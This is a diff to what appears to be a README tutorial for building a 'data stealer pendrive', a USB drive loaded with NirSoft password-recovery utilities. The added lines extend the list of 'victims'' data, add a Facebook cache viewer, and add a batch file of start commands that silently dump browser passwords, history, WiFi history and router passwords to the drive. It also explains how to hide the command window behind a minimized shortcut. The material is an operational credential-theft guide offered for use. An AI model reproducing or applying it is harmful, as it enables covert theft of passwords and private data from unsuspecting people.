@@ -6,7 +6,14 @@ By using this process you can get the victims:
       Browser Downloads
       Browser History
       Browser Saved Passwords
+      Facebook Cache
+      Wifi History
+      Router Passwords
+      and others.....
 
+All the process are done for you in Release option!!
+
+You can download it and directly add it to your pendrive.
 
 First of all go to this link https://www.nirsoft.net/password_recovery_tools.html
 
@@ -29,10 +36,11 @@ Then download:
       https://www.nirsoft.net/utils/web_browser_downloads_view.html
       https://www.nirsoft.net/utils/process_tcp_summary.html
       https://www.nirsoft.net/utils/router_password_recovery.html
+      https://www.nirsoft.net/utils/facebook_cache_viewer.html
     
 Your pendrive will look like this after downloading all the above files:
 
-https://i.imgur.com/sbzTDM1.png
+https://i.imgur.com/36rvypD.png
 
 
 
@@ -56,3 +64,22 @@ Finally paste the code below:
       start RouterPassView.exe /stext Passwords\RouterPassView.txt
       start WebBrowserPassView.exe /stext Passwords\WebBrowserPass.txt
       start WifiHistoryView.exe /stext Passwords\WifiHistoryView.txt
+      start FBCacheView.exe /stext Passwords\FBCache.txt
+
+then,
+
+Create a shortcut for  Start.bat  named Start
+
+then,
+
+Right click on the shortcut you created 
+
+Left click on Properties and in  Run  set it to  Minimized 
+
+So you have successfully created a data stealer pendrive.
+
+Your Pendrive should look like this:
+
+https://i.imgur.com/44TPRS2.png
+
+To start the stealing process you just have to click the  Start  shortcut then cmd will be opened in background and will save all the information to your pendrive.
